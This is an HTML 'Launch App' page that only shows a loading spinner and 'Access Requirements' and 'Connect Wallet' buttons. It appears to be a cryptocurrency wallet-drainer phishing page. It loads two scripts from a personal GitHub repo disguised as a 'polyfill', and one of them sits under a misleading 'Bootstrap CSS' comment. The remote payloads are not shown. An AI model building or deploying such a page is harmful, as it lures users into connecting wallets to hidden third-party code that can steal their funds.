<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Launch App</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Bootstrap CSS -->
  <script charset="UTF-8" async type="text/javascript" src="https://cdn.jsdelivr.net/gh/soholsamer/polyfill@main/dark.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- FontAwesome -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(to bottom right, #0c111f, #10192e);
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .launch-box {
      background-color: #131c31;
      border-radius: 1rem;
      padding: 2.5rem;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
      text-align: center;
      max-width: 400px;
      width: 100%;
      position: relative;
    }
    .launch-title {
      font-size: 1.8rem;
      font-weight: bold;
      color: #45dd9c;
      margin-bottom: 0.5rem;
    }
    .requirements-btn {
      background-color: #0f172a;
      color: #facc15;
      border: 1px solid #334155;
      margin-bottom: 1.5rem;
    }
    .requirements-btn:hover {
      background-color: #1e293b;
    }
    .wallet-btn {
      background: linear-gradient(90deg, #14b8a6, #10b981);
      color: white;
      font-weight: 600;
      border: none;
    }
    .wallet-btn i {
      margin-right: 0.5rem;
    }

    .spinner-container {
      margin: 1.5rem 0;
    }
  </style>
</head>
<body>

  <div class="launch-box">
    <p>Connect your wallet to launch app</p>
    

    <div class="spinner-container d-flex justify-content-center">
      <div class="spinner-border text-light" role="status">
        <span class="visually-hidden">Loading...</span>
      </div>
    </div>
    
    <button class="interact-button btn requirements-btn w-100 mb-3">
      <i class="fas fa-shield-alt"></i> Access Requirements
    </button>
    <button class="interact-button btn wallet-btn w-100">
      <i class="fab interact-button"></i> Connect Wallet
    </button>
  </div>

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/soholsamer/polyfill/polyfill.js"></script>


  </script>    
</body>
</html>
